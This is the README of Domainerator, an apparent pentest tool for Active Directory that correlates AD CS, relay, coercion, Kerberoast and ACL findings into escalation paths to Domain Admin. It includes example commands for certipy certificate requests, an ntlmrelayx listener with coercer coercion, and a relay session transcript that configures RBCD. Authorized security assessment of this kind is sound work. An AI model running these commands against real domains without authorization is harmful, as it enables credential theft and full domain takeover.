# Domainerator

[![CI](https://github.com/BurritoWrangler/Domainerator/actions/workflows/ci.yml/badge.svg)](https://github.com/BurritoWrangler/Domainerator/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)

> **Authorized use only.** Run Domainerator only against systems you own or have
> explicit written permission to test. See [DISCLAIMER.md](DISCLAIMER.md).

An **attack-path mapping** tool for internal **Windows Active Directory** assessments,
including **AD CS** (Active Directory Certificate Services). Domainerator runs on Linux
(built for **Kali**), orchestrates [netexec](https://github.com/Pennyw0rth/NetExec),
[Certipy](https://github.com/ly4k/Certipy), [Impacket](https://github.com/fortra/impacket),
and [BloodHound-CE.py](https://github.com/dirkjanm/BloodHound.py) against a target Windows
domain, then **correlates the findings into ranked privilege-escalation paths** from an
unauthenticated or low-privileged position up to **Domain Admin / Enterprise Admin**.

It runs in two modes:

- **Unauthenticated** — given just a target (and optionally a domain), it probes SMB
  signing, NULL sessions, anonymous share/RID enumeration, LDAP anonymous bind, LDAP
  signing / channel-binding relay exposure, WebDAV/WebClient discovery, **timeroasting**
  (NTP computer-account hashes, no creds required), and AS-REP roasting (with a userlist).
- **Authenticated** — given a domain, username, and password (or NT hash), it adds
  password-policy review, local-admin detection, Kerberoasting, delegation
  enumeration, active **RBCD enumeration**, **coercion-surface detection**
  (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce), **noPac** (CVE-2021-42278/42287),
  MachineAccountQuota, **GPP cpassword** (SYSVOL), **pre-Windows 2000 computer
  accounts**, a full AD CS template audit (**ESC1–ESC16**), and **BloodHound-based ACL
  path analysis** (GenericAll, WriteDacl, ForceChangePassword, AddMember, shadow
  credentials, RBCD, GPO abuse, DCSync, more).

### RBCD and WebDAV / cross-protocol relay

Beyond BloodHound's RBCD edges, Domainerator actively reads
`msDS-AllowedToActOnBehalfOfOtherIdentity` across computer objects to surface existing
RBCD relationships and where write access enables new ones. It also discovers hosts
running the **WebClient (WebDAV)** service and checks whether the DC's LDAP lacks
signing / channel binding — together these form the classic HTTP-coercion → relay-to-LDAP
→ RBCD / shadow-credentials chain, which the path engine assembles automatically.

### Coercion, noPac, ADCS ESC9–ESC16, and GPO abuse

- **Coercion detection** probes MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-DFSNM
  (DFSCoerce), and MS-FSRVP (ShadowCoerce), turning the coercion node in relay chains
  from an assumption into a confirmed capability.
- **noPac** (CVE-2021-42278/42287) is detected directly; combined with a creatable
  machine account it is a high-reliability path to DCSync / Domain Admin.
- **AD CS** coverage now spans **ESC1–ESC16** (adds ESC9/10/13/15/16), with the
  exploitable ones producing certificate → PKINIT → DCSync path steps.
- **GPO abuse**: control over a GPO (or `WriteGPLink` on an OU/site) becomes a
  code-execution-on-linked-hosts hop toward local/Domain Admin.

### NTLMv1, NTLM reflection, and SCCM / PXE NAA

- **NTLMv1 acceptance** — flags hosts that still negotiate NTLMv1, whose DES-based
  responses are crackable to the NT hash (feeds the crack → credentials chain).
- **NTLM reflection** — detects hosts where coerced authentication can be relayed back
  to the same host (self-relay), a direct route to local administrator on that host.
- **SCCM / PXE NAA** — discovers SCCM management points / sites in AD and probes
  PXE-enabled distribution points for recoverable **Network Access Account** credentials,
  which are valid domain credentials and a useful foothold.

### Credential-recovery footholds: GPP, pre-2000, timeroasting

- **GPP cpassword** — searches SYSVOL Group Policy Preferences for a `cpassword` value
  encrypted with the public, Microsoft-published AES key. Any authenticated user who can
  read SYSVOL can decrypt it to plaintext (often privileged) domain credentials
  (`low_priv_user` → `valid_credentials`).
- **Pre-Windows 2000 computer accounts** — flags computer objects whose password matches
  the predictable pre-2000 default (the lowercased account name), a free authenticated
  foothold as a machine account (`low_priv_user` → `valid_credentials`).
- **Timeroasting** — abuses MS-SNTP to recover crackable computer-account hashes over NTP
  with no domain credentials required (`unauthenticated` → `crackable_hash` → crack →
  `valid_credentials`).

## Detection and guidance

Domainerator enumerates, correlates, and reports the routes to Domain/Enterprise Admin,
printing the exact operator command for each step so **you** decide what to run. It never
sprays passwords, coerces authentication, requests certificates, or performs DCSync on its
own. The interactive console provides guided execution with confirmation prompts, but all
exploitation actions require explicit operator approval.

> Intended for authorized security testing only. Run it only against systems you have
> explicit written permission to assess.

## Interactive Console

After scanning, launch the **Metasploit-style interactive console** to explore discovered
attack paths and guide through exploitation:

```bash
domainerator -t 10.0.0.10 -d corp.local -u alice -p 'S3cret!' --console
```

The console provides:

- **Path browser** — `show paths` lists all discovered escalation paths ranked by reliability
- **Path selection** — `use <id>` selects a specific attack path to explore
- **Variable substitution** — `set LHOST 10.0.0.5` fills command placeholders (Metasploit-style)
- **Step-by-step guidance** — `run` or `exploit` walks through each step with command preview
- **Real execution** — run commands through the built-in runner (scope-enforced, password-redacted)
- **Reactive capability tracking** — successful step output auto-grants the resulting capability and recomputes paths
- **Relay orchestration** — `relay` coordinates a background `ntlmrelayx` listener with a coercion trigger as one action
- **Multi-target sessions** — `targets`/`target <id>` switch the active host among everything you scanned
- **Loot capture** — hashes, tickets, and certs are extracted from output into `show loot`
- **Session persistence** — `save` persists state for iterative foothold→DA workflows

### Console commands

| Command | Description |
| --- | --- |
| `help` | Show available commands |
| `show paths` | Display discovered attack paths (ranked by reliability) |
| `show findings` | Display all findings from checks (sorted by severity) |
| `show capabilities` | Show current privilege state |
| `show targets` | Display target information |
| `show loot` | Show hashes/tickets/certs captured from executed steps |
| `use <id>` | Select an attack path by ID |
| `info` | Show details of selected path and current step |
| `preview` | Show the current step's fully-substituted command without running |
| `run` / `exploit` | Execute/guide through current step (with confirmation) |
| `next` | Advance to next step in path |
| `back` | Deselect current path, return to main menu |
| `set <NAME> <value>` | Set a variable that fills command placeholders |
| `unset <NAME>` | Clear a variable |
| `options` | Show all variables and the placeholders they fill |
| `grant <capability>` | Manually mark a capability as obtained (recomputes paths) |
| `targets` | List all scanned hosts and mark the active one |
| `target <id>` | Switch the active target to a scanned host |
| `relay [mode] [method]` | Coordinate a background ntlmrelayx listener with a coercion trigger |
| `scan [check]` | Run additional checks (all or specific) |
| `rescan` | Re-run all checks with current capabilities |
| `save [file]` | Save session state to file |
| `report [dir]` | Regenerate Markdown + JSON report from the current session state |
| `status` | Show session status |
| `exit` / `quit` | Exit console (auto-saves if state file configured) |

### Command variables

Path-step commands are templates with placeholders (attacker IP, userlist, CA name, etc.).
The console maps these to settable variables. Target-derived values (`DC`, `DC_IP`,
`DOMAIN`, `USER`, `PASS`) are auto-populated from your scan arguments; the rest you set as
needed. `options` lists them all:

| Variable | Fills placeholders | Auto-filled from |
| --- | --- | --- |
| `LHOST` | `ATTACKER-IP`, `ATTACKER-HOST`, `attacker@port` | — (set manually) |
| `USERLIST` | `users.txt` | — |
| `PASSLIST` | `passwords.txt` | — |
| `DC` | `DC` | target host |
| `DC_IP` | `DC-IP` | `--dc-ip` |
| `DOMAIN` | `DOMAIN` | `--domain` |
| `USER` | `USER` | `--username` |
| `PASS` | `PASS` | `--password` |
| `CA` | `CORP-CA`, `CA-NAME`, `CA_NAME` | — |
| `TEMPLATE` | `TEMPLATE-NAME`, `TEMPLATE_NAME` | — |
| `SPRAY_PASSWORD` | `Season2025!` | — |

A command is only runnable once its recognised placeholders are filled — the console
refuses to execute a step with unfilled variables and tells you which are missing.

### Execution and the reactive loop

When you choose `[r]` to run a step, the substituted command is parsed to an argument list
and executed through the same `ToolRunner` used for scanning, so `--scope` enforcement and
password redaction still apply. Commands that use shell features (pipes, redirects) or are
written as multi-command guidance (starting with `#`) are shown for you to run manually
rather than executed blindly.

After a run, the output is inspected for technique-specific success signals (e.g. a
`$krb5tgs$` blob for Kerberoast, a saved certificate for ADCS). On a confirmed success the
console **grants the resulting capability, recomputes the attack paths, and advances to the
next step** — so `show paths` always reflects your current reality. If the signal isn't
recognised, the step is reported as unconfirmed and you can record progress yourself with
`grant <capability>` or the `[m]` option.

### Multi-target sessions

When you scan more than one host (`--targets hosts.txt`, or repeated `--target`), the
console keeps them all. `targets` lists them and marks the one you're working on; `target
<id>` makes another host active:

```
domainerator > targets

ID   Host                         Domain               Auth
------------------------------------------------------------------
*0   10.0.0.10                    corp.local           yes
 1   10.0.0.20                    corp.local           no
 2   10.0.0.30                    corp.local           no

* = active target. Use 'target <id>' to switch.

domainerator > target 1
Active target is now [1] 10.0.0.20 (corp.local)
Command variables re-seeded from this target.
```

Switching re-seeds the target-derived command variables (`DC`, `DC_IP`, `DOMAIN`, `USER`,
`PASS`) from the newly active host, so subsequent commands point at the host you're working
on. Variables you set explicitly with `set` are treated as operator-owned and are **never**
overwritten by a target switch — only auto-derived values follow the active host. The
attack paths, capabilities, and loot are session-wide, so switching targets changes what
commands point at without discarding your progress.

### Relay orchestration

NTLM-relay chains need two processes running at once: a listener (`ntlmrelayx.py`) and a
coercion trigger. Coordinating them by hand means juggling terminals and getting the timing
right. The `relay` command sequences them as a single action:

1. Starts `ntlmrelayx.py` in the background (scope-enforced, output captured).
2. Waits until it reports it is serving.
3. Fires the coercion at the victim host, aimed at your listener.
4. Watches the relay output for a success signal.
5. Tears the listener down cleanly, whatever the outcome.

```
domainerator > set LHOST 10.0.0.5
domainerator > relay ldap-rbcd coercer
Select victim host to coerce (or type a host/IP):
  [0] 10.0.0.10 (active)
  [1] 10.0.0.20
  [2] 10.0.0.30
Victim: 1

============================================================
Relay orchestration plan
============================================================
Mode:      ldap-rbcd - Relay coerced auth to LDAP(S) on the DC and configure RBCD...
Coercion:  coercer
Listener:  10.0.0.5
Relay to:  10.0.0.10
Victim:    10.0.0.20
Grants:    rbcd on success

Two coordinated commands will run:
  1. listener:  ntlmrelayx.py -t ldaps://10.0.0.10 --delegate-access --no-dump ...
  2. coercion:  coercer coerce -t 10.0.0.20 -l 10.0.0.5 -u alice -p ****** -d corp.local

WARNING: coercion is LOUD and touches the victim host. Ensure it is authorized and in scope.

Proceed? [y/N]: y
  Starting listener: ntlmrelayx.py -t ldaps://10.0.0.10 ...
  Servers started, waiting for connections
  Firing coercion: coercer coerce -t 10.0.0.20 -l 10.0.0.5 ...
  Watching relay for a success signal...
  Authenticating against ldaps://10.0.0.10
  msDS-AllowedToActOnBehalfOfOtherIdentity was set successfully
  Tearing down listener.

[+] relay success signal detected in listener output
[+] Granting capability 'rbcd'.
    Attack paths recomputed.
```

**Modes** (what the relayed auth does):

| Mode | Action | Grants on success |
| --- | --- | --- |
| `ldap-rbcd` | Relay to LDAP(S) on the DC, configure RBCD for a controlled account | `rbcd` |
| `ldap-shadow` | Relay to LDAP(S), add shadow credentials (msDS-KeyCredentialLink) | `reset_password` |
| `reflection` | Reflect coerced auth back to the originating host over SMB (self-relay) | `local_admin` |
| `adcs-esc8` | Relay coerced DC auth to the AD CS web-enrollment endpoint for a DC certificate | `cert_as_da` |

**Coercion methods**: `coercer` (multi-method sweep), `petitpotam` (MS-EFSR),
`printerbug` (MS-RPRN), `dfscoerce` (MS-DFSNM).

Values are drawn from session variables: `LHOST` (your listener), `DC_IP`/`DC` (the LDAP
relay target for the ldap-* modes), and `USER`/`PASS`/`DOMAIN` for the coercion credentials.
The victim host is chosen from your scanned hosts (pick by number) or typed directly, and
can be preset with `set RELAY_VICTIM <host>`. Because the LDAP relay target and credentials
come from the active target's variables, `target <id>` is the quick way to line the relay up
against a different host. For `reflection` the relay target defaults to the victim itself.
Passwords are masked in the displayed commands, and the whole action is refused if the
listener or victim would fall outside `--scope`.

For `adcs-esc8`, set `CA` to the Certificate Authority host (`set CA ca01.corp.local`, or a
full `http(s)://.../certsrv/certfnsh.asp` URL); the relay target becomes the CA's web-
enrollment endpoint and the victim defaults to the DC (whose machine-account auth is relayed
to obtain a `DomainController` certificate). On success it grants `cert_as_da`, which the
`PKINIT-auth` step then turns into `dcsync` → Domain Admin — so `relay adcs-esc8 petitpotam`
drives the whole ESC8 chain as one coordinated action instead of juggling terminals.

As with everything in Domainerator, **no exploit code ships in the tool** — `relay` only
coordinates `ntlmrelayx.py` and the coercion tool you already have installed. If either is
missing from PATH the action reports it and stops.

### Example console session

```
domainerator > show paths

ID   Goal                 Steps  Reliability   Noise
------------------------------------------------------------
 0   domain_admin         4      High          Moderate
     ESC1 -> PKINIT-auth -> DCSync -> Domain Admin
 1   domain_admin         6      Moderate      Loud
     RID-cycling -> Password-spray -> Kerberoast -> Hash-crack -> ...

Total: 2 paths

domainerator > set CA CORP-CA
CA => CORP-CA

domainerator > use 0
Selected path 0: ESC1 -> PKINIT-auth -> DCSync => domain_admin
Steps: 4

Step 1/4: ESC1 - Exploitable certificate template
Technique: ESC1
Reliability: High
Noise: Moderate

Command:
  certipy req -u alice -p S3cret! -dc-ip 10.0.0.10 -ca CORP-CA -template ...

domainerator (path) > run
...
Options:
  [r] Run this command now
  [c] Copy command to clipboard
  [s] Skip this step
  [m] Mark as completed (manually done)
  [q] Cancel

Choice [r/c/s/m/q]: r

WARNING: This will execute the command shown above.
Proceed? [y/N]: y

Executing...
Got certificate with UPN 'alice@corp.local'
Saved certificate and private key to 'alice.pfx'

[+] Success: granting capability 'cert_as_da'.
    Attack paths recomputed. Advancing to next step.
```

## The main goal: attack paths

The headline output is a set of ranked chains, each a sequence of hops ending at a goal
capability (`dcsync`, `domain_admin`, or `enterprise_admin`). For example:

```
Attack paths to DA/EA (2):
  [1] RID-cycling -> Password-spray -> Kerberoast -> Hash-crack -> ESC1 -> PKINIT-auth -> DCSync -> DCSync  (reliability: Speculative, 8 steps)
  [2] ForceChangePassword -> DCSync  (reliability: High, 2 steps)
```

Each path is expanded in the Markdown/JSON report with a per-step description and the
copy-paste command to perform that hop. Paths are ranked by **weakest-link reliability**
first (a chain is only as dependable as its least-reliable step), then by fewest steps,
then by lowest noise.

## Target platform

Designed to run on **Kali Linux** (or a similar pentest distro) with Python **3.11+**.
Kali ships the required tooling in its repositories.

## Dependencies

Domainerator itself is pure Python standard library — it shells out to external tools.
Install the tools it drives:

| Tool | Used for | Install on Kali |
| --- | --- | --- |
| `nxc` (NetExec) | SMB/LDAP checks | `sudo apt install netexec` or `pipx install netexec` |
| `certipy` / `certipy-ad` | AD CS ESC checks | `pipx install certipy-ad` |
| `GetNPUsers.py` (Impacket) | AS-REP roasting | `sudo apt install impacket-scripts` or `pipx install impacket` |
| `bloodhound-python` | ACL-based path collection (BloodHound-CE) | `pipx install bloodhound-ce` |
| `ntlmrelayx.py` (Impacket) | Relay listener for `relay` orchestration | `sudo apt install impacket-scripts` or `pipx install impacket` |
| `coercer` | Coercion trigger for `relay` orchestration | `pipx install coercer` |
| `PetitPotam.py` / `printerbug.py` / `dfscoerce.py` | Alternative coercion triggers | project scripts on PATH |

A missing tool never aborts the run — the checks that need it are reported as
**skipped** with an install hint.

## Quickstart

```bash
git clone https://github.com/BurritoWrangler/Domainerator
cd Domainerator
./install.sh                      # installs Domainerator + external tools via pipx
domainerator --help
```

## Install

Kali enforces PEP 668 (externally managed environment), so the installer uses `pipx`.

### Recommended: install script

```bash
./install.sh                # Domainerator + netexec, certipy-ad, impacket, bloodhound-ce
./install.sh --core-only    # just Domainerator (install the external tools yourself)
```

The script installs `pipx` if it is missing, installs Domainerator, then installs each
external tool in its own isolated pipx environment. It is idempotent — re-run it to
upgrade. Individual tool failures are warnings, not fatal.

### Manual

```bash
pipx install .                     # Domainerator only
# then the tools you want:
pipx install git+https://github.com/Pennyw0rth/NetExec
pipx install certipy-ad
pipx install impacket
pipx install bloodhound-ce
```

Or a throwaway virtualenv for development:

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"            # includes pytest + ruff
```

Either way you get a `domainerator` command on your PATH. A missing external tool never
aborts a run — checks that need it are reported as **skipped** with an install hint.

## Usage

Unauthenticated sweep of a domain controller:

```bash
domainerator --target 10.0.0.10 --domain corp.local
```

Unauthenticated AS-REP roast with a userlist:

```bash
domainerator --target 10.0.0.10 --domain corp.local --userlist users.txt
```

Authenticated audit (includes AD CS), writing both reports:

```bash
domainerator \
  --target dc01.corp.local --domain corp.local --dc-ip 10.0.0.10 \
  --username alice --password 'S3cret!' \
  --output report.md --json report.json
```

Authenticate with an NT hash instead of a password:

```bash
domainerator -t 10.0.0.10 -d corp.local -u alice -H aad3b435b51404ee...:31d6cfe0d16ae931...
```

Prompt for the password securely (omit `-p`):

```bash
domainerator -t 10.0.0.10 -d corp.local -u alice --prompt-password
```

Preview the exact commands without running them:

```bash
domainerator -t 10.0.0.10 -d corp.local -u alice -p 'S3cret!' --dry-run -v
```

### BloodHound / ACL-based paths

Collect BloodHound data during the run (uses `bloodhound-python` with your creds) and
fold ACL edges into the path analysis:

```bash
domainerator -t dc01.corp.local -d corp.local --dc-ip 10.0.0.10 \
  -u alice -p 'S3cret!' --bloodhound -o report.md --json report.json
```

Or ingest data you already collected (a SharpHound/BloodHound.py `.zip`, a single
`.json`, or a directory of `*.json`):

```bash
domainerator -t dc01.corp.local -d corp.local -u alice -p 'S3cret!' \
  --bloodhound-data ./20240101_bloodhound.zip -o report.md
```

Domainerator targets the **BloodHound-CE** JSON format (a top-level `data` array with a
`meta` object). It recognises ACL edges including `GenericAll`, `GenericWrite`,
`WriteDacl`, `WriteOwner`, `Owns`, `ForceChangePassword`, `AddMember`/`AddSelf`,
`AllExtendedRights`, `AddKeyCredentialLink` (shadow credentials), `AllowedToAct` and
`AddAllowedToAct`/`WriteAccountRestrictions` (RBCD), `AllowedToDelegate`, `WriteSPN`
(targeted Kerberoast), `ReadLAPSPassword`/`SyncLAPSPassword`, `ReadGMSAPassword`,
`DumpSMSAPassword`, `DCSync`/`GetChanges(All)`, and GPO abuse (`WriteGPLink`, plus
full-control ACLs over GPO objects). Right names are matched case-insensitively. Edges
terminating at high-value objects (Domain/Enterprise Admins, Domain Controllers, the
built-in Administrator) become direct hops toward the goal.

Collection uses `bloodhound-python -c DCOnly`, which queries only the domain controller
(no fan-out to every workstation). This keeps collection compatible with a `--scope`
that only lists the DC.

### Scope confinement

Use `--scope` to confine **all** testing to an allowlist of hosts. The scope file has one
entry per line; entries may be single IPs or CIDR subnets, and `#` comments and blank
lines are ignored:

```
# engagement scope
10.0.0.0/24
10.0.5.10
192.168.50.0/26
```

```bash
domainerator -t 10.0.0.10 -d corp.local --scope engagement.scope -u alice -p 'S3cret!'
```

Scope is enforced centrally in the tool runner: before any external tool executes, each
host-like argument is resolved and checked for membership in the scope. A command aimed
at an out-of-scope host is **refused** (recorded as an error, not run), and the primary
target / DC IP are validated up front so an out-of-scope target aborts immediately with
exit code 2. This makes it safe to point Domainerator at a DC while guaranteeing it never
reaches beyond the agreed range.

### Multiple targets, subnets & concurrency

Both `--target` and `--targets` accept **CIDR subnets**, which are expanded to their usable
host addresses (IPv4 and IPv6). Scan a whole subnet concurrently, correlating findings from
all hosts plus domain-wide BloodHound data into one path analysis:

```bash
# a subnet directly on --target
domainerator -t 10.0.0.0/24 -d corp.local -u alice -p 'S3cret!' \
  --workers 8 --scope engagement.scope -o report.md

# or a mix of IPs, hostnames, and CIDRs in a file
domainerator -T hosts.txt -d corp.local -u alice -p 'S3cret!' \
  --workers 8 --scope engagement.scope -o report.md
```

`hosts.txt` is one IP/host/CIDR per line (`#` comments allowed). Entries are expanded and
de-duplicated, so an IP that also falls inside a listed subnet is only scanned once.
`--target` and `--targets` can be combined. A single CIDR that would expand beyond 4096
hosts is refused (narrow the prefix or list hosts explicitly) so a fat-fingered `/8` can't
blow up the run. If any expanded target (or `--dc-ip`) is outside `--scope`, the run aborts
before touching anything. In `--console` mode, every scanned host is kept in the session so
you can switch the active target with `target <id>` and pick relay victims from them (see
[Multi-target sessions](#multi-target-sessions)).

### Trustworthy results: inconclusive state & tool inventory

A check that runs but whose output shows a connection/auth failure — or whose expected
signal is absent — is reported as **inconclusive**, not clean. This prevents a parser
miss or an unreachable host from being read as "not vulnerable". The report also records
a **tool inventory** (detected versions of nxc/certipy/impacket/bloodhound-python) so a
parser miss can be correlated with a tool-version change.

### Live status (press Enter)

While a scan is running in an interactive terminal, press **Enter** at any time to print
an nmap-style status snapshot: elapsed time, how many *(host, category)* units have
completed, and which are currently running with their per-unit elapsed time.

```
Stats: 12s elapsed; 3/9 units done (33%)
  Running (2):
    authenticated@10.0.0.10  (8s)
    unauthenticated@10.0.0.11  (2s)
```

This is auto-disabled when stdin is not a TTY (pipes, CI), under `--dry-run`, or with
`--no-status`, so it never interferes with scripted runs or output redirection.

### Guided workflow: next best action & resume state

- **Next best action.** From the ranked paths and your current capabilities, Domainerator
  prints the single highest-value command to run next, so the workflow is step-by-step
  rather than a wall of output.
- **Resume state (`--state file.json`).** Persists discovered capabilities between runs.
  After you manually gain something (crack a hash, obtain creds), add it to the state
  file's `capabilities` (e.g. `"valid_credentials"`) and re-run: the path engine re-seeds
  from your progress without redoing enumeration. This is the iterative
  foothold → Domain Admin loop.

```bash
# first pass (unauth), saving state
domainerator -t 10.0.0.10 -d corp.local --state engagement.state -o pass1.md
# ... you crack an AS-REP hash and get creds; add "valid_credentials" to engagement.state
# second pass (authed), re-seeded from state
domainerator -t 10.0.0.10 -d corp.local -u alice -p 'S3cret!' --state engagement.state -o pass2.md
```

### Key options

| Option | Description |
| --- | --- |
| `-t, --target` | Target host/IP, or a CIDR subnet (e.g. `10.0.0.0/24`) expanded to its hosts |
| `-T, --targets` | File of targets (one IP/host/CIDR per line) to scan concurrently |
| `-d, --domain` | AD domain (FQDN) |
| `--dc-ip` | Domain controller IP (Kerberos/AD CS) |
| `-u, --username` | Domain username (enables authenticated checks) |
| `-p, --password` | Password (omit to be prompted) |
| `-H, --hash` | NT hash instead of a password |
| `-k, --kerberos` | Use Kerberos authentication |
| `--userlist` | User list file for unauthenticated AS-REP roasting |
| `--skip-unauth` / `--skip-auth` / `--skip-adcs` / `--skip-sccm` | Skip a check category |
| `--bloodhound` | Collect BloodHound data with `bloodhound-python` (needs creds) |
| `--bloodhound-output` | Directory for collection output (default `bloodhound-output`) |
| `--bloodhound-data` | Ingest existing `.zip` / `.json` / directory of `*.json` |
| `--no-paths` | Disable attack-path correlation |
| `--max-path-depth` | Max steps in a correlated path (default 8) |
| `--scope` | Scope file (one IP/CIDR per line); confines all testing |
| `--workers` | Concurrent workers when scanning multiple targets (default 5) |
| `--no-status` | Disable the interactive "press Enter for status" feature |
| `--console` | Launch interactive Metasploit-style console after scanning |
| `--state` | JSON state file: seeds known capabilities, updated with findings |
| `--timeout` | Per-command timeout in seconds (default 300) |
| `--dry-run` | Show commands without executing |
| `-o, --output` | Write Markdown report to a file |
| `--json` | Write JSON report to a file |
| `--output-dir` | Engagement artifacts folder: per-run evidence files (command + raw output) for screenshots, plus reports |
| `--include-raw` | Include raw tool output in the Markdown report |
| `--no-color` | Disable colored console output |

### Exit codes

- `0` — no escalation path found and no findings above INFO/LOW severity
- `1` — a complete escalation path was found, or at least one MEDIUM+ finding
  (useful for gating in CI/automation)
- `2` — configuration error (e.g. bad scope file, or target outside scope)

## Output

Every run prints a colored console summary. With `--output`/`--json` you also get:

- **Markdown** — findings grouped and sorted by severity, with evidence and
  remediation, plus a per-check execution log.
- **JSON** — machine-readable, including raw tool output for further processing.

### Evidence capture for reports (`--output-dir`)

When you need screenshots for a customer report, point `--output-dir` at a folder. Each
run creates a timestamped subfolder with one text file per check — a self-contained header
(check name, target, exact command, status, timestamp) followed by the raw tool output —
so a single screenshot carries its own context:

```
engagement/
└── run-20260917-214717/
    ├── evidence/
    │   ├── 001_unauthenticated_smb-signing-posture.txt
    │   ├── 002_authenticated_kerberoastable-service-accounts.txt
    │   ├── 003_authenticated_gpp-cpassword-in-sysvol.txt
    │   ├── exec_001_kerberoast.txt        # commands run in the console
    │   └── exec_002_relay-ldap-rbcd.txt   # relay orchestration transcripts
    ├── report.md
    └── report.json
```

Skipped checks are omitted (nothing to screenshot). Commands are password-redacted, the
same as everywhere else. In `--console` mode, every command you execute (including relay
orchestration) is captured as an `exec_*.txt` file, and the `report` command regenerates
`report.md`/`report.json` from the live session state into the same run folder — so after
interactive work you get a deliverable that reflects everything you actually did.

## How it works

- `runner.py` — locates tools on PATH and executes them as argument lists (never a
  shell string), redacting passwords/hashes from recorded commands and logs.
- `checks/` — one module per mode (`unauthenticated`, `authenticated`, `adcs`); each
  builds tool commands, parses output, and emits both `Finding` objects and `PathStep`
  objects (what a finding requires and what it grants).
- `bloodhound.py` — collects (via `bloodhound-python`) and/or ingests BloodHound data,
  translating ACL edges into `PathStep` objects toward high-value targets.
- `paths.py` — the attack-graph model (`Capability`, `PathStep`, `AttackPath`) and a
  best-first `PathEngine` that chains steps from the starting posture to DA/EA, plus
  technique-independent baseline "glue" steps (e.g. DCSync ⇒ Domain Admin).
- `report.py` — aggregates findings and ranked paths, renders JSON / Markdown / console.
- `cli.py` — argument parsing and orchestration.

### How paths are built

Each check and each BloodHound edge is expressed as a `PathStep` that *requires* a set
of capabilities and *grants* one (e.g. Kerberoast requires `valid_credentials` and
grants `spn_tgs`; cracking grants `valid_credentials` again but for a different, often
privileged, account). The engine seeds the search with your starting capabilities
(`unauthenticated`, plus `valid_credentials`/`low_priv_user` when creds are supplied)
and performs a best-first search over capability sets to every goal, keeping the
best-ranked chain per goal.

## Security notes

- Credentials are passed to child tools via argument lists and are masked in the
  recorded command strings and verbose logs.
- Passwords can be provided interactively (`--prompt-password`) to keep them out of
  your shell history.
- Treat generated reports as sensitive: they can contain hashes and directory data.
- The `.gitignore` excludes reports, BloodHound output, scope files, and loot
  (`*.hash`, `*.tgs`, `*.pfx`, `*.ccache`) so engagement data doesn't get committed.

## Project layout

```
domainerator/
├── src/domainerator/
│   ├── cli.py              # argument parsing + orchestration
│   ├── runner.py           # tool execution, scope enforcement, Target model
│   ├── scan.py             # per-target scan + concurrent multi-target scanning
│   ├── progress.py         # live status tracker + keypress (Enter) listener
│   ├── state.py            # resume/state file (cross-run capabilities)
│   ├── paths.py            # attack-graph model + best-first PathEngine
│   ├── bloodhound.py       # BloodHound-CE collection/ingestion -> PathSteps
│   ├── report.py           # JSON / Markdown / console rendering
│   ├── evidence.py         # per-check / per-execution evidence files (screenshots)
│   ├── console/            # interactive Metasploit-style console
│   │   ├── console.py      # REPL loop + command dispatcher
│   │   ├── session.py      # runtime state + capability tracking
│   │   ├── variables.py    # command placeholder substitution
│   │   ├── outcomes.py     # output-driven success detection + loot
│   │   └── relay.py        # ntlmrelayx + coercion orchestration
│   └── checks/             # unauthenticated, authenticated, adcs check modules
├── tests/fixtures/         # captured tool outputs for parser regression tests
├── tests/                  # pytest suite (scope, bloodhound, paths)
├── examples/               # sample scope file
├── install.sh              # pipx-based installer for tool + dependencies
├── pyproject.toml
├── LICENSE
└── DISCLAIMER.md
```

## Development & testing

```bash
pip install -e ".[dev]"
ruff check .        # lint
pytest -q           # unit tests (scope, BloodHound-CE parser, path engine)
python -m build     # build sdist + wheel
```

CI (GitHub Actions) runs lint, byte-compile, tests, a package build, and a CLI smoke
test across Python 3.11–3.13 on every push and pull request.

## Contributing

Issues and pull requests are welcome. Please keep contributions consistent with the
**detection-and-guidance** design (no built-in exploitation), add or update tests for
new checks / BloodHound edges, and run `ruff` and `pytest` before opening a PR.
